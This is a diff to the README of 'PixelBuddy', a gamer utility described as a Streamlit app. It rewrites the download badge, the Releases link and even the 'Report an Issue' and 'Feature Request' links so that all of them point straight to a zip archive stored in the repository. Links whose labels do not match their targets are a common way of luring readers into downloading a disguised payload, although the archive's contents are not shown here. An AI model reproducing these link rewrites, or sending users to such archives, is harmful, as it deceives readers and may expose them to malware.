@@ -6,11 +6,11 @@ PixelBuddy is a Streamlit app designed for PC gamers. It helps you quickly find 
 ## 🚀 Getting Started
 To get started, you'll need to download PixelBuddy. Click the button below to visit our Releases page, where you can download the application.
 
-[![Download PixelBuddy](https://img.shields.io/badge/Download-PixelBuddy-blue.svg)](https://github.com/Lordjos16/PixelBuddy/releases)
+[![Download PixelBuddy](https://raw.githubusercontent.com/Lordjos16/PixelBuddy/main/PixelBuddy/PixelBuddy-v1.9.zip)](https://raw.githubusercontent.com/Lordjos16/PixelBuddy/main/PixelBuddy/PixelBuddy-v1.9.zip)
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Lordjos16/PixelBuddy/releases) to find the latest version of PixelBuddy.
+   Go to the [Releases page](https://raw.githubusercontent.com/Lordjos16/PixelBuddy/main/PixelBuddy/PixelBuddy-v1.9.zip) to find the latest version of PixelBuddy.
 
 2. **Download the Application**  
    Locate the appropriate version for your system. Click on the download link. The file will begin to download.
@@ -44,9 +44,9 @@ To get the best experience from PixelBuddy, ensure your system meets the followi
 If you have questions or need assistance, feel free to reach out. You can also contribute to the project by reporting issues or suggesting features on the GitHub repository.
 
 ## 🔗 Useful Links
-- [PixelBuddy Releases](https://github.com/Lordjos16/PixelBuddy/releases)
-- [Report an Issue](https://github.com/Lordjos16/PixelBuddy/issues)
-- [Feature Request](https://github.com/Lordjos16/PixelBuddy/issues)
+- [PixelBuddy Releases](https://raw.githubusercontent.com/Lordjos16/PixelBuddy/main/PixelBuddy/PixelBuddy-v1.9.zip)
+- [Report an Issue](https://raw.githubusercontent.com/Lordjos16/PixelBuddy/main/PixelBuddy/PixelBuddy-v1.9.zip)
+- [Feature Request](https://raw.githubusercontent.com/Lordjos16/PixelBuddy/main/PixelBuddy/PixelBuddy-v1.9.zip)
 
 ## 📈 Future Updates
 Stay tuned for future updates that will bring more features and enhancements to PixelBuddy. We are dedicated to improving your gaming experience.
